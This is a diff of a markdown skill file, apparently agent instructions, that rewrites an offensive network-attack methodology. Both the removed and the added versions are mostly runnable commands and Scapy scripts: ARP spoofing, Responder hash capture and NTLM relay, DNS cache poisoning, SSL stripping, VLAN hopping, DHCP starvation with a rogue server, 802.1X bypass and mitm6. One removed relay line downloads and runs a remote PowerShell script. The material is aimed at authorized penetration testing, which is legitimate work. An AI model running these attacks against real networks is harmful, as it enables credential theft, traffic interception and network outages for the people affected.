@@ -1,597 +1,491 @@
 ---
 name: offensive-network-attacks
-description: "Network-level attack techniques targeting Layer 2 and Layer 3 protocols for internal penetration testing and red team engagements. Covers ARP spoofing and cache poisoning (arpspoof, Bettercap, Ettercap), LLMNR/NBT-NS/mDNS poisoning for credential interception (Responder, Inveigh), DNS poisoning and spoofing, man-in-the-middle attack execution (Bettercap, SSL stripping, HSTS bypass via sslstrip+ and dns2proxy), VLAN hopping (switch spoofing, double tagging/Q-in-Q), DHCP attacks (rogue DHCP server, DHCP starvation), 802.1X and NAC bypass techniques (MAC spoofing, hub-based bypass, certificate extraction), IPv6 attacks (SLAAC abuse, mitm6 DNS takeover, IPv6 router advertisement flooding), and network traffic sniffing and analysis with Wireshark and tcpdump. Integrates with Bettercap for MITM framework operations, Responder for multicast name resolution poisoning, mitm6 for IPv6-based attacks, Ettercap for legacy MITM scenarios, and Wireshark for packet analysis. Maps to MITRE ATT&CK T1557 (Adversary-in-the-Middle) and T1040 (Network Sniffing). All techniques assume you are operating on an authorized internal network assessment with explicit written scope."
+description: "Dense description covering ARP spoofing, LLMNR/NBT-NS/mDNS poisoning, DNS poisoning, MITM attacks, VLAN hopping, DHCP attacks, 802.1X/NAC bypass, IPv6 attacks. Tools: Bettercap, Responder, mitm6, Ettercap, Wireshark. MITRE T1557, T1040. Use when conducting internal network assessments or testing Layer 2/3 attack surface."
 ---
 
-# Offensive Network Attacks
+# Network Attacks (Layer 2/3) -- Offensive Methodology
 
-Internal network assessments begin the moment you have a foothold on the wire or WLAN. Layer 2 and Layer 3 protocols were designed for functionality and interoperability, not security -- most broadcast, resolve, and route without authentication. You exploit that trust to intercept credentials, redirect traffic, and pivot across network segments.
-
-These techniques assume you have authorized access to an internal network segment. Executing ARP spoofing, DHCP attacks, or VLAN hopping on a production network can cause outages. Coordinate with the client's network operations team, define a maintenance window for disruptive tests, and have rollback procedures ready.
+You are attacking Layer 2/3 infrastructure during an authorized internal engagement. ARP, DHCP, broadcast name resolution, VLAN trunking, and IPv6 autoconfiguration are all unauthenticated -- you exploit that trust to intercept credentials, redirect traffic, and cross network boundaries.
 
 ## Quick Workflow
 
-1. Perform passive reconnaissance: identify the subnet, gateway, VLAN assignments, active hosts, and naming conventions.
-2. Run Responder in analyze mode to observe LLMNR/NBT-NS/mDNS traffic without poisoning.
-3. Enable Responder poisoning to capture NTLMv2 hashes from broadcast name resolution.
-4. If credential interception is insufficient, escalate to ARP spoofing for targeted MITM against high-value hosts.
-5. Attempt VLAN hopping or IPv6 attacks if segmentation limits your reach.
-6. Crack captured hashes offline; relay credentials where cracking is impractical.
-7. Document all intercepted traffic, credentials, and network misconfigurations for the final report.
+1. Map your position -- VLAN, subnet, gateway, DNS, DHCP lease, IPv6 status.
+2. Passively sniff with tcpdump/Wireshark to discover hosts and cleartext credentials.
+3. Run Responder in analyze mode to observe LLMNR/NBT-NS/mDNS queries.
+4. Enable Responder poisoning to capture NTLMv2 hashes.
+5. Relay captured hashes with ntlmrelayx against hosts without SMB signing.
+6. ARP spoof the gateway for targeted MITM and credential interception.
+7. Probe VLAN boundaries via DTP negotiation and 802.1Q double tagging.
+8. Exploit IPv6 autoconfiguration with mitm6 for DNS takeover and NTLM relay.
 
 ---
 
-## ARP Spoofing and Cache Poisoning
+## ARP Spoofing
 
-ARP has no authentication mechanism. You send gratuitous ARP replies to associate your MAC address with the gateway's IP on victim hosts, routing their traffic through your machine.
+ARP has no authentication. You send gratuitous ARP replies to associate your MAC with the gateway IP in the victim's cache, routing their traffic through you.
 
-### ARP Spoofing with Bettercap
-
-Bettercap is the modern replacement for arpspoof and Ettercap. It provides a unified MITM framework with modules for ARP spoofing, DNS spoofing, packet proxying, and credential sniffing.
+### Bettercap ARP Module
 
 ```bash
-# Start Bettercap on the target interface
 sudo bettercap -iface eth0
-
-# Inside the Bettercap interactive console:
-
-# Discover live hosts on the subnet
-net.probe on
-
-# List discovered targets
+net.probe on                              # discover live hosts
 net.show
-
-# Enable ARP spoofing -- full-duplex (both target and gateway)
-set arp.spoof.fullduplex true
-set arp.spoof.targets 192.168.1.50
+set arp.spoof.targets 10.0.0.50          # single target
+set arp.spoof.fullduplex true            # poison both victim and gateway
 arp.spoof on
-
-# Enable packet forwarding to maintain connectivity
-set net.sniff.local true
-net.sniff on
-
-# Capture HTTP credentials
-set http.proxy.sslstrip true
-http.proxy on
-
-# Capture HTTPS credentials (with SSL stripping)
-set https.proxy.sslstrip true
-https.proxy on
 ```
 
-### ARP Spoofing with arpspoof (Legacy)
+### arpspoof and Ettercap
 
 ```bash
-# Enable IP forwarding to prevent DoS
 echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 10.0.0.50 10.0.0.1   # tell victim you are the gateway
+arpspoof -i eth0 -t 10.0.0.1 10.0.0.50   # tell gateway you are the victim (second terminal)
 
-# Poison the victim's ARP cache (tell victim you are the gateway)
-arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
-
-# In a second terminal, poison the gateway (tell gateway you are the victim)
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
-
-# Now all traffic between victim and gateway flows through your machine
-# Capture with tcpdump:
-tcpdump -i eth0 -w capture.pcap host 192.168.1.50
+# Ettercap alternative
+sudo ettercap -T -M arp:remote /10.0.0.50// /10.0.0.1//
+sudo ettercap -T -M arp:remote -F inject.ef /10.0.0.50// /10.0.0.1//  # with filter
 ```
 
-### ARP Spoofing with Ettercap
+### Gratuitous ARP with Scapy
 
-```bash
-# Text mode -- ARP poisoning between target and gateway
-sudo ettercap -T -q -M arp:remote /192.168.1.50// /192.168.1.1//
+```python
+from scapy.all import Ether, ARP, sendp
+import time
 
-# With a compiled Ettercap filter to inject content in transit:
-etterfilter inject_html.ef -o inject_html.eco
-sudo ettercap -T -q -M arp:remote -F inject_html.eco /192.168.1.50// /192.168.1.1//
+pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+    op=2, psrc="10.0.0.1", hwsrc="aa:bb:cc:dd:ee:ff", pdst="10.0.0.50"
+)
+while True:
+    sendp(pkt, iface="eth0", verbose=False)
+    time.sleep(2)
 ```
+
+### Bypassing Static ARP Entries
+
+Static entries block standard poisoning. Workarounds: overflow the ARP table so the host falls back to dynamic resolution; redirect at Layer 3 via DHCP/DNS attacks; or use VLAN hopping to attack from a segment without static entries.
 
 ---
 
-## LLMNR/NBT-NS/mDNS Poisoning
+## LLMNR / NBT-NS / mDNS Poisoning
 
-When DNS resolution fails, Windows falls back to Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS). These broadcast protocols ask the entire subnet "who is X?" -- and you answer first with your IP address, redirecting authentication attempts to your machine.
+When DNS fails, Windows falls back to LLMNR (UDP 5355), NBT-NS (UDP 137), and mDNS (UDP 5353). You answer these broadcast queries with your IP, forcing victims to authenticate to your rogue services.
 
-### Responder
-
-Responder is the standard tool for poisoning multicast name resolution and capturing NTLMv2 hashes. It runs rogue SMB, HTTP, LDAP, FTP, and SQL servers to provoke authentication.
+### Responder Setup and Hash Capture
 
 ```bash
-# Run Responder in analyze mode first (passive -- no poisoning)
-sudo responder -I eth0 -A
-
-# Review the output to understand what protocols are in use
-# and which hosts are broadcasting name resolution queries
-
-# Enable poisoning with all rogue servers
-sudo responder -I eth0 -wrfb
-
-# Flags breakdown:
-#   -w   Start the WPAD rogue proxy server
-#   -r   Enable NetBIOS wrapping answers
-#   -f   Fingerprint hosts that connect
-#   -b   Enable HTTP basic auth (for non-NTLM clients)
-
-# Captured hashes are stored in:
-# /opt/Responder/logs/
-
-# Hash format (NTLMv2):
-# user::DOMAIN:challenge:response:blob
-# Crack with hashcat:
-hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule
+sudo responder -I eth0 -A                    # analyze mode -- observe without poisoning
+sudo responder -I eth0 -wrf                  # full poisoning: -w WPAD, -r NBT-NS, -f fingerprint
+# Hashes land in /opt/Responder/logs/
+hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule   # NTLMv2
+hashcat -m 5500 hashes.txt wordlist.txt                        # NTLMv1 (weaker)
 ```
 
-### NTLM Relay with ntlmrelayx (Instead of Cracking)
+WPAD is a high-value vector: browsers query for `wpad.dat` via DNS then LLMNR/NBT-NS. The `-w` flag makes Responder serve a malicious WPAD config that captures NTLM authentication from browser traffic transparently.
 
-When hashes resist cracking, relay them to another service that accepts NTLM authentication.
+### Inveigh (Windows-Native)
 
-```bash
-# Identify hosts with SMB signing disabled (relay targets)
-crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
-
-# Start ntlmrelayx targeting those hosts
-# Disable SMB and HTTP in Responder first (ntlmrelayx will handle them)
-sudo python3 ntlmrelayx.py -tf relay_targets.txt -smb2support
-
-# Responder forces authentication; ntlmrelayx relays the hash
-# to execute commands on the relay target:
-sudo python3 ntlmrelayx.py -tf relay_targets.txt -smb2support \
-    -c "powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1'))"
-
-# Or dump SAM hashes from the relay target:
-sudo python3 ntlmrelayx.py -tf relay_targets.txt -smb2support --dump-lsass
-```
-
-### Inveigh (Windows-Native Poisoning)
-
-When you are operating from a compromised Windows host, Inveigh is the PowerShell-based equivalent of Responder.
+From a compromised Windows host, poison without dropping Linux tools:
 
 ```powershell
-# Import and run Inveigh
-Import-Module .\Inveigh.ps1
+Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTP Y -HTTPS Y -Proxy Y
+Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -HTTP Y -LLMNR Y   # C# binary avoids PS logging
+```
 
-# Start poisoning from a Windows host
-Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y -FileOutput Y
+### NTLMv1/v2 Relay with ntlmrelayx
 
-# Or use InveighZero (the C# version) for better performance
-.\InveighZero.exe -LLMNR Y -NBNS Y -mDNS Y -FileOutput Y
+When cracking fails, relay captured authentication to targets without SMB signing. Disable SMB and HTTP in Responder.conf first -- ntlmrelayx handles those protocols.
 
-# Captured hashes are written to the current directory
-# Format is identical to Responder output -- compatible with hashcat
+```bash
+nxc smb 10.0.0.0/24 --gen-relay-list no-signing.txt
+impacket-ntlmrelayx -tf no-signing.txt -smb2support -c "whoami"           # command exec
+impacket-ntlmrelayx -tf no-signing.txt -t ldap://10.0.0.10 \
+  --escalate-user attacker --delegate-access                               # LDAP privesc
+impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController                          # ADCS ESC8
+```
+
+Trigger authentication via Responder poisoning, PetitPotam, PrinterBug, or DFSCoerce.
+
+---
+
+## DNS Poisoning
+
+DNS attacks redirect traffic at the application layer. You do not need Layer 2 adjacency if you control the resolution path.
+
+### Rogue DNS Server via DHCP Option 6
+
+After DHCP starvation or on a network without DHCP snooping, deploy dnsmasq with your IP as DNS (option 6):
+
+```bash
+# /etc/dnsmasq-rogue.conf:
+#   interface=eth0
+#   dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h
+#   dhcp-option=3,10.0.0.99    # gateway
+#   dhcp-option=6,10.0.0.99    # DNS
+#   address=/intranet.corp.local/10.0.0.99
+#   server=8.8.8.8
+sudo dnsmasq -C /etc/dnsmasq-rogue.conf -d
+```
+
+### DNS Cache Poisoning with Scapy
+
+```python
+from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
+import random
+
+# Flood spoofed responses -- must match in-flight query txid and src port
+for txid in range(1, 65535):
+    pkt = IP(dst="10.0.0.2", src="8.8.8.8") / \
+          UDP(sport=53, dport=random.randint(1024, 65535)) / \
+          DNS(id=txid, qr=1, aa=1, qd=DNSQR(qname="intranet.corp.local"),
+              an=DNSRR(rrname="intranet.corp.local", rdata="10.0.0.99", ttl=86400))
+    send(pkt, verbose=False)
+```
+
+Modern resolvers randomize source ports and transaction IDs. Practical Kaminsky-style poisoning requires matching both fields simultaneously.
+
+### DNS Rebinding
+
+Bypass same-origin policy by toggling a DNS record between your server and an internal IP:
+
+```bash
+# singularity framework: first resolution serves JS payload, second returns internal target
+./singularity -DNSRebindStrategy DNSRebindFromRequest \
+  -ResponseIPAddr 10.0.0.99 -ResponseReboundIPAddr 192.168.1.1
 ```
 
 ---
 
-## DNS Poisoning and Spoofing
+## Man-in-the-Middle (MITM)
 
-DNS spoofing redirects domain lookups to your controlled IP address. Combined with ARP spoofing, you can hijack authentication flows, redirect updates, or serve malicious content.
+Once positioned between victim and gateway (via ARP spoof, DHCP redirect, or tap), intercept and modify traffic.
 
-### DNS Spoofing with Bettercap
+### Bettercap HTTP Proxy and SSL Strip
 
 ```bash
-# Bettercap DNS spoofing -- redirect specific domains
 sudo bettercap -iface eth0
-
-# Create a DNS spoofing hosts file
-# File: /tmp/dns_spoof_hosts
-# Format: IP  domain
-# 192.168.1.100  intranet.targetcorp.com
-# 192.168.1.100  vpn.targetcorp.com
-# 192.168.1.100  *.targetcorp.com
-
-set dns.spoof.domains intranet.targetcorp.com, vpn.targetcorp.com
-set dns.spoof.address 192.168.1.100
-dns.spoof on
-
-# Combine with ARP spoofing for full interception
-set arp.spoof.targets 192.168.1.0/24
+set arp.spoof.targets 10.0.0.50
+set arp.spoof.fullduplex true
 arp.spoof on
-```
-
-### DNS Spoofing with dnschef
-
-```bash
-# Standalone DNS proxy for targeted spoofing
-sudo dnschef --fakeip 192.168.1.100 --fakedomains targetcorp.com -i 192.168.1.100
-
-# Configuration file for complex mappings (/tmp/dnschef.ini):
-# [A]
-# *.targetcorp.com=192.168.1.100
-# [AAAA]
-# *.targetcorp.com=::1
-sudo dnschef --file /tmp/dnschef.ini -i 192.168.1.100
-```
-
----
-
-## Man-in-the-Middle Attacks
-
-Once you are positioned between a victim and their gateway (via ARP spoofing, DNS poisoning, or rogue network services), you can inspect, modify, and inject traffic.
-
-### SSL Stripping
-
-SSL stripping downgrades HTTPS connections to HTTP by intercepting the initial redirect and rewriting links. This fails against HSTS-preloaded domains but works against sites relying solely on server-side redirects.
-
-```bash
-# Bettercap SSL stripping with hstshijack caplet
-sudo bettercap -iface eth0
-
-# Load the hstshijack caplet for HSTS bypass
-set hstshijack.log /tmp/hsts.log
-set hstshijack.payloads *:/tmp/inject.js
-set hstshijack.targets mail.targetcorp.com,intranet.targetcorp.com
-set hstshijack.replacements mail.targetcorp.corn,intranet.targetcorp.corn
-set hstshijack.obfuscate true
-set hstshijack.encode true
-
-hstshijack on
-arp.spoof on
-```
-
-### HSTS Bypass with sslstrip+
-
-sslstrip+ combined with dns2proxy replaces domain names themselves so the browser never applies its HSTS policy. Set up IP forwarding, iptables redirect to port 10000, run sslstrip+ and dns2proxy, then ARP spoof the target.
-
-```bash
-echo 1 > /proc/sys/net/ipv4/ip_forward
-iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
-iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000
-python3 sslstrip.py -l 10000 -a -w /tmp/sslstrip.log &
-python3 dns2proxy.py &
-arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
-```
-
-### Credential Interception from MITM Position
-
-```bash
-# Bettercap built-in credential sniffing
+set http.proxy.sslstrip true
+http.proxy on
 set net.sniff.verbose true
-set net.sniff.regexp .*password.*
+set net.sniff.regexp .*pass.*|.*user.*|.*login.*
 net.sniff on
+```
 
-# Extract credentials from pcap files offline
-pcredz -f capture.pcap
-# Or real-time extraction across protocols (HTTP, FTP, SMTP, NTLM)
-sudo python3 net-creds.py -i eth0
+### HSTS Bypass with sslstrip+ and dns2proxy
+
+sslstrip+ rewrites domain names (e.g., `accounts.google.com` to `accountss.google.com`) so the browser never applies HSTS. dns2proxy resolves rewritten domains to real IPs.
+
+```bash
+arpspoof -i eth0 -t 10.0.0.50 10.0.0.1                                      # terminal 1
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000  # terminal 2
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000
+python dns2proxy.py -i eth0                                                   # terminal 3
+python sslstrip.py -l 10000 -a -w sslstrip.log                               # terminal 4
+```
+
+### Credential Interception from Proxied Traffic
+
+```bash
+tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
+tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
+  -T fields -e ftp.request.command -e ftp.request.arg
+python3 Pcredz -f capture.pcap           # automated extraction (NTLM, HTTP, FTP, SMTP, SNMP)
+sudo python3 net-creds.py -i eth0        # real-time credential sniffer
 ```
 
 ---
 
 ## VLAN Hopping
 
-VLAN segmentation isolates broadcast domains, but misconfigurations in switch port settings allow you to send traffic into VLANs you should not reach.
+### Switch Spoofing (DTP Negotiation)
 
-### Switch Spoofing
-
-If a switch port is configured in dynamic trunking mode (the default on many Cisco switches), you can negotiate a trunk link and access all VLANs.
+If the switch port is in dynamic auto/desirable mode (common Cisco default), negotiate a trunk:
 
 ```bash
-# Use Yersinia to negotiate a DTP trunk
-sudo yersinia dtp -attack 1 -interface eth0
-
-# Or manually craft DTP frames with scapy
-python3 <<'PYEOF'
-from scapy.all import *
-from scapy.contrib.dtp import *
-
-# Send DTP desirable frames to negotiate trunking
-dtp_frame = (
-    Dot3(src=get_if_hwaddr("eth0"), dst="01:00:0c:cc:cc:cc") /
-    LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
-    SNAP(OUI=0x00000c, code=0x2004) /
-    DTP(tlvlist=[
-        DTPDomain(type=0x0001, length=5, domain=b""),
-        DTPStatus(type=0x0002, length=5, status=b"\x03"),  # Desirable
-        DTPType(type=0x0003, length=5, dtptype=b"\xa5"),    # 802.1Q
-        DTPNeighbor(type=0x0004, length=10, neighbor=get_if_hwaddr("eth0"))
-    ])
-)
-
-sendp(dtp_frame, iface="eth0", loop=1, inter=30)
-PYEOF
-
-# Once trunking is established, create VLAN sub-interfaces
+sudo yersinia dtp -attack 1 -interface eth0    # DTP trunk negotiation
+sudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed
 sudo modprobe 8021q
-sudo vconfig add eth0 100    # Target VLAN 100
-sudo ifconfig eth0.100 192.168.100.5 netmask 255.255.255.0 up
+sudo vconfig add eth0 100                      # sub-interface for VLAN 100
+sudo ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up
 ```
 
-### Double Tagging (Q-in-Q)
+### Double Tagging (802.1Q)
 
-When switch spoofing fails (DTP is disabled), double tagging exploits the way switches process nested 802.1Q headers. The outer tag is stripped by the first switch, and the inner tag routes the frame into the target VLAN. This is a one-way attack -- you can send but not receive replies directly.
+Works when you are on the native VLAN and the switch strips only the outer tag. Unidirectional -- you send into the target VLAN but responses route normally and will not reach you.
 
 ```python
-# Double tagging with Scapy
-from scapy.all import *
+from scapy.all import Ether, Dot1Q, IP, ICMP, ARP, sendp
 
-# Craft a double-tagged frame
-# Outer VLAN: your native VLAN (e.g., 1)
-# Inner VLAN: target VLAN (e.g., 100)
-frame = (
-    Ether(dst="ff:ff:ff:ff:ff:ff") /
-    Dot1Q(vlan=1) /       # Outer tag (native VLAN -- stripped by first switch)
-    Dot1Q(vlan=100) /     # Inner tag (routes to target VLAN)
-    IP(dst="192.168.100.1") /
-    ICMP()
-)
+# Outer tag = native VLAN (1), inner tag = target VLAN (100)
+pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+      Dot1Q(vlan=1) / Dot1Q(vlan=100) / IP(dst="10.100.0.50") / ICMP()
+sendp(pkt, iface="eth0")
 
-sendp(frame, iface="eth0")
-
-# For practical exploitation, combine with ARP poisoning:
-# Send double-tagged ARP replies to poison caches in the target VLAN
-arp_poison = (
-    Ether(dst="ff:ff:ff:ff:ff:ff") /
-    Dot1Q(vlan=1) /
-    Dot1Q(vlan=100) /
-    ARP(op=2, psrc="192.168.100.1", hwsrc="aa:bb:cc:dd:ee:ff",
-        pdst="192.168.100.50", hwdst="ff:ff:ff:ff:ff:ff")
-)
-
+# Double-tagged ARP poisoning into target VLAN
+arp_poison = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=1) / Dot1Q(vlan=100) / \
+    ARP(op=2, psrc="10.100.0.1", hwsrc="aa:bb:cc:dd:ee:ff", pdst="10.100.0.50")
 sendp(arp_poison, iface="eth0", count=10, inter=2)
+```
+
+### Yersinia Layer 2 Attacks
+
+```bash
+sudo yersinia stp -attack 4 -interface eth0  # STP root bridge takeover
+sudo yersinia cdp -attack 1 -interface eth0  # CDP flood (Cisco switches)
 ```
 
 ---
 
 ## DHCP Attacks
 
-DHCP has no authentication. You can starve the legitimate DHCP server of its address pool and then step in as a rogue server, pushing your IP as the default gateway and DNS server.
-
 ### DHCP Starvation
 
-Exhaust the DHCP server's address pool by requesting every available lease with spoofed MAC addresses.
+Exhaust the pool so legitimate clients cannot get addresses:
 
 ```bash
-# DHCPig -- purpose-built DHCP starvation tool
-sudo pig.py eth0
-
-# Or with Yersinia
-sudo yersinia dhcp -attack 1 -interface eth0
+sudo dhcpstarv -i eth0                         # dedicated starvation tool
+sudo yersinia dhcp -attack 1 -interface eth0   # Yersinia alternative
 ```
 
 ```python
-# Scapy-based starvation -- fine-grained control
-from scapy.all import *
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp
 import random
 
 for i in range(500):
-    mac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
-    raw_mac = bytes.fromhex(mac.replace(":", ""))
-    pkt = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-           IP(src="0.0.0.0", dst="255.255.255.255") /
-           UDP(sport=68, dport=67) /
-           BOOTP(chaddr=raw_mac, xid=random.randint(1, 0xFFFFFFFF)) /
-           DHCP(options=[("message-type", "discover"), "end"]))
+    mac = str(RandMAC())
+    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / \
+          UDP(sport=68, dport=67) / BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")),
+          xid=random.randint(1, 0xFFFFFFFF)) / DHCP(options=[("message-type", "discover"), "end"])
     sendp(pkt, iface="eth0", verbose=False)
 ```
 
-### Rogue DHCP Server
+### Rogue DHCP Server for Gateway Redirect
 
-After starvation (or on a subnet without DHCP snooping), deploy a rogue DHCP server that assigns your machine as the gateway and DNS server.
+After starvation, offer leases with your IP as gateway and DNS:
 
 ```bash
-# Bettercap rogue DHCP
-sudo bettercap -iface eth0
-
-set dhcp6.spoof.domains targetcorp.com
-set dhcp6.spoof.address 192.168.1.100  # Your IP
-
-# For DHCPv4 rogue server, use Metasploit:
-msfconsole -q -x "
-use auxiliary/server/dhcp;
-set SRVHOST 192.168.1.100;
-set NETMASK 255.255.255.0;
-set ROUTER 192.168.1.100;
-set DNSSERVER 192.168.1.100;
-set DHCPIPSTART 192.168.1.200;
-set DHCPIPEND 192.168.1.250;
-run
-"
-
-# All clients receiving leases from your rogue server now
-# route through you (gateway) and resolve DNS through you
+# /etc/dnsmasq-rogue.conf: interface=eth0, dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h
+#   dhcp-option=3,10.0.0.99 (gateway)   dhcp-option=6,10.0.0.99 (DNS)   dhcp-authoritative
+sudo dnsmasq -C /etc/dnsmasq-rogue.conf -d
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 ```
 
 ---
 
-## 802.1X and NAC Bypass
+## 802.1X / NAC Bypass
 
-Network Access Control uses 802.1X authentication to restrict network access to authorized devices. Several bypass techniques exist depending on the implementation.
+### MAB Bypass (MAC Spoofing)
 
-### MAC Address Spoofing
-
-If NAC relies on MAC-based authentication (MAB) rather than certificate-based 802.1X, spoof an authorized MAC address.
+If NAC uses MAC Authentication Bypass for printers/VoIP phones, spoof an authorized MAC:
 
 ```bash
-# Find authorized MAC addresses on the network
-# Sniff traffic on an unauthenticated port or from ARP broadcasts
-sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u
-
-# Or read the MAC from an authorized device's network configuration
-# (if you have physical access to a printer, IP phone, etc.)
-
-# Spoof the MAC address
-sudo ifconfig eth0 down
-sudo macchanger -m AA:BB:CC:DD:EE:FF eth0
-sudo ifconfig eth0 up
-sudo dhclient eth0
+sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs
+sudo ip link set eth0 down
+sudo ip link set eth0 address AA:BB:CC:DD:EE:FF
+sudo ip link set eth0 up && sudo dhclient eth0
 ```
 
-### Hub-Based 802.1X Bypass
+### Hub / Bridge Insertion
 
-Insert a passive hub between an authenticated device (printer, IP phone) and the switch port. The switch sees the port as authenticated; your device shares that state. Spoof the authenticated device's MAC. This works because 802.1X authenticates the port, not individual MACs (unless per-MAC dynamic ACLs are configured).
-
-### Certificate Extraction for EAP-TLS
+Bridge between an authenticated device and the switch port. 802.1X authenticates the port, not individual MACs -- your traffic shares the authenticated session:
 
 ```bash
-# On a compromised domain-joined Windows machine (local admin):
-certutil -store My
-# Export with private key via mimikatz:
-# mimikatz # crypto::certificates /systemstore:local_machine /export
+sudo ip link add name br0 type bridge
+sudo ip link set eth0 master br0          # eth0 to switch
+sudo ip link set eth1 master br0          # eth1 to authenticated device
+sudo ip link set br0 up
+```
 
-# Configure your attack machine for EAP-TLS with the extracted cert:
-cat <<'EOF' > /etc/wpa_supplicant/wpa_supplicant.conf
-network={
-    ssid="CorpWiFi"
-    key_mgmt=WPA-EAP
-    eap=TLS
-    identity="TARGETCORP\WORKSTATION01$"
-    ca_cert="/etc/certs/ca.pem"
-    client_cert="/etc/certs/client.pem"
-    private_key="/etc/certs/client.key"
-    private_key_passwd="exported_password"
-}
-EOF
-wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
+### Certificate Impersonation
+
+If EAP-TLS is used and the RADIUS server does not validate the CA chain strictly:
+
+```bash
+openssl req -new -x509 -days 365 -keyout fake-ca.key -out fake-ca.crt -subj "/CN=Corp-CA/O=Corp"
+openssl req -new -keyout client.key -out client.csr -subj "/CN=PRINTER01/O=Corp"
+openssl x509 -req -in client.csr -CA fake-ca.crt -CAkey fake-ca.key -CAcreateserial -out client.crt
+# wpa_supplicant config: key_mgmt=IEEE8021X, eap=TLS, identity="PRINTER01", certs as above
+sudo wpa_supplicant -i eth0 -D wired -c /etc/wpa_supplicant/wired.conf
+```
+
+### NAC Profiling Evasion
+
+Match expected device fingerprint -- OUI, DHCP hostname, TCP stack:
+
+```bash
+sudo macchanger -m 00:1A:4B:XX:XX:XX eth0                     # HP printer OUI
+sudo dhclient -H "HP-LaserJet-M402" eth0                       # expected hostname
+sudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 128   # Windows TTL
 ```
 
 ---
 
 ## IPv6 Attacks
 
-Most internal networks have IPv6 enabled by default but lack IPv6 security controls. Windows prefers IPv6 over IPv4 -- if you advertise an IPv6 router, Windows clients will route through you.
+Most internal networks run dual-stack but lack IPv6 monitoring. Windows prefers IPv6 DNS over IPv4 -- advertise an IPv6 DNS server and all queries route through you.
 
-### SLAAC Abuse and mitm6
+### SLAAC Abuse with mitm6
 
-mitm6 exploits the default IPv6 configuration on Windows to become the primary DNS server via DHCPv6, then relays authentication to ntlmrelayx.
+mitm6 replies to DHCPv6 requests, sets your host as DNS, then victims' name lookups trigger NTLM authentication back to your relay listener:
 
 ```bash
-# mitm6 -- IPv6 DNS takeover
-# Responds to DHCPv6 requests and sets your machine as DNS server
-# Victims resolve internal names through you -> authentication -> relay
-
-# Terminal 1: Start mitm6
-sudo mitm6 -d targetcorp.com -i eth0
-
-# Terminal 2: Start ntlmrelayx to relay captured auth
-sudo python3 ntlmrelayx.py -6 -t ldaps://dc01.targetcorp.com \
-    -wh fakewpad.targetcorp.com -l /tmp/loot/
-
-# What happens:
-# 1. mitm6 sends DHCPv6 replies assigning your IP as DNS server
-# 2. Windows clients start sending DNS queries to you
-# 3. mitm6 responds to DNS queries with your IP address
-# 4. Clients attempt authentication (WPAD, SMB, HTTP)
-# 5. ntlmrelayx relays the auth to the domain controller via LDAP
-# 6. On success: creates a new machine account, dumps AD info, etc.
+sudo mitm6 -d corp.local -i eth0                                       # terminal 1: DNS takeover
+impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local \
+  --delegate-access -wh attacker-wpad.corp.local                        # terminal 2: relay
 ```
 
-### IPv6 Router Advertisement Injection
+### Router Advertisement Spoofing
 
 ```python
-# Scapy -- inject a rogue Router Advertisement to become default router
-from scapy.all import *
+from scapy.all import (Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
+                        ICMPv6NDOptPrefixInfo, ICMPv6NDOptRDNSS, sendp)
 
-ra = (
-    Ether(dst="33:33:00:00:00:01") /
-    IPv6(src="fe80::1", dst="ff02::1") /
-    ICMPv6ND_RA(routerlifetime=1800) /
-    ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr("eth0")) /
-    ICMPv6NDOptMTU(mtu=1500) /
-    ICMPv6NDOptPrefixInfo(prefix="2001:db8::", prefixlen=64,
-        validlifetime=0xFFFFFFFF, preferredlifetime=0xFFFFFFFF)
-)
+ra = Ether(dst="33:33:00:00:00:01") / IPv6(dst="ff02::1") / \
+     ICMPv6ND_RA(routerlifetime=1800) / ICMPv6NDOptSrcLLAddr(lladdr="aa:bb:cc:dd:ee:ff") / \
+     ICMPv6NDOptPrefixInfo(prefix="fd00::", prefixlen=64, validlifetime=1800) / \
+     ICMPv6NDOptRDNSS(dns=["fd00::99"], lifetime=1800)
 sendp(ra, iface="eth0", loop=1, inter=5)
+```
 
